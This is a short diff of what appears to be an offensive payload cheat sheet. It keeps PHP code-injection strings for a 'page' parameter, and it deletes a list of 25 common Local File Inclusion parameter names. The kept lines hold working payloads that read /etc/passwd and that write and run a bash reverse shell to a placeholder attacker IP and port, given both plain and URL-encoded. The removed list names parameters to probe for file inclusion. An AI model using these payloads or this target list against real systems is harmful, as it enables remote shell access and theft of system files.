@@ -37,33 +37,3 @@ page=' and die(system('cat /etc/passwd')) or '
 # page=' and die(system('echo \'/bin/bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1\' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && /bin/bash /tmp/revshell.sh')) or '
 page=' and die(system('echo '%2Fbin%2Fbash -i >%26 %2Fdev%2Ftcp%2F<attacker ip>%2F<attacker port> 0>%261' > %2Ftmp%2Frevshell.sh %26%26 chmod 777 %2Ftmp%2Frevshell.sh %26%26 %2Fbin%2Fbash %2Ftmp%2Frevshell.sh')) or '%0A
 ```
-
-Top 25 Local File Inclusion (LFI) Parameters for @trbughunters
-
-```
-?cat={payload}
-?dir={payload}
-?action={payload}
-?board={payload}
-?date={payload}
-?detail={payload}
-?file={payload}
-?download={payload}
-?path={payload}
-?folder={payload}
-?prefix={payload}
-?include={payload}
-?page={payload}
-?inc={payload}
-?locate={payload}
-?show={payload}
-?doc={payload}
-?site={payload}
-?type={payload}
-?view={payload}
-?content={payload}
-?document={payload}
-?layout={payload}
-?mod={payload}
-?conf={payload}
-```
